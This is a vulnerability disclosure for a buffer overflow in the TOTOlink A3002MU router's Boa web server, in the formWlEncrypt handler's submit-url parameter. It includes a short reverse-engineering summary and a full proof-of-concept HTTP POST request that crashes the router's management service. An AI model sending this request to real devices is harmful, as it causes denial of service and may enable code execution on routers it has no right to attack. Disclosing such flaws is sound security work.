# TARGET

**Product:** TOTOlink A3002MU
 **Model:** A3002MU AC1200 Giga Wireless Router
 **Vendor:** TOTOLINK
 **Official Website:** https://www.totolink.net/
 **Firmware Version:** Hh-B20211125.1046

# BUG TYPE

**Buffer Overflow Vulnerability**

# Abstract

A buffer overflow vulnerability exists in the TOTOlink A3002MU router. The vulnerability is located in the `/bin/boa` web server's `formWlEncrypt` interface and is related to the handling of the `submit-url` parameter. Because the firmware does not properly validate the length of this user-controllable input, a remote attacker can send a crafted HTTP request containing an overlong value. Successful exploitation may cause a denial-of-service condition and could potentially lead to arbitrary code execution.

# Details

The `formWlEncrypt` function was analyzed using IDA Pro. The `submit-url` parameter is read from the HTTP request and later copied into a fixed-size buffer with unsafe string-copy logic. Since the copy path does not enforce a reliable length boundary, an overlong value can overwrite adjacent memory and crash the Boa process.

![analysis screenshot 1](bof-formWlEncrypt.assets/image7.png)

# POC

The affected endpoint is `POST /boafrm/formWlEncrypt HTTP/1.1`.

The crafted request or malicious URL used during verification is shown below:

```http
POST /boafrm/formWlEncrypt HTTP/1.1
Host: 192.168.0.1

sessionCheck=cac91717f28ec1bc09fba74d6f46ca57&submit-url=baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&SSID_Setting0=1&has_vwlan0=&wpaAuth0=psk&wpa11w0=none&wpa2EnableSHA2560=disable&ciphersuite0=aes&wpa2ciphersuite0=aes&wps_clear_configure_by_reg0=0&wlan_disabled0=0&wlan_ssid0=TOTOLINK_A3002MU_5G&method0=0&stanums0=32&authType0=auto&wepKeyLen0=wep64&wepEnabled0=ON&length0=1&format0=2&key0=&pskFormat0=0&pskValue0=&preAuth0=&radiusIP0=&radiusPort0=1812&radiusPass0=&use1x0=OFF&eapType0=0&eapInsideType0=0&eapUserId0=&radiusUserName0=&radiusUserPass0=&radiusUserCertPass0=&wl_access0=0&tx_restrict0=0&rx_restrict0=0&hiddenSSID0=0&sync_password0=&save_apply=1
```

Before the attack, the router management interface is accessible and operating normally.

The malicious request or URL is sent to the target device during verification.

After the crafted request is sent and the management page is refreshed, the router web service stops responding, confirming a denial-of-service condition.

![poc screenshot 2](bof-formWlEncrypt.assets/image2.png)

![poc screenshot 3](bof-formWlEncrypt.assets/image3.png)

![poc screenshot 4](bof-formWlEncrypt.assets/image4.png)

![poc screenshot 5](bof-formWlEncrypt.assets/image5.png)
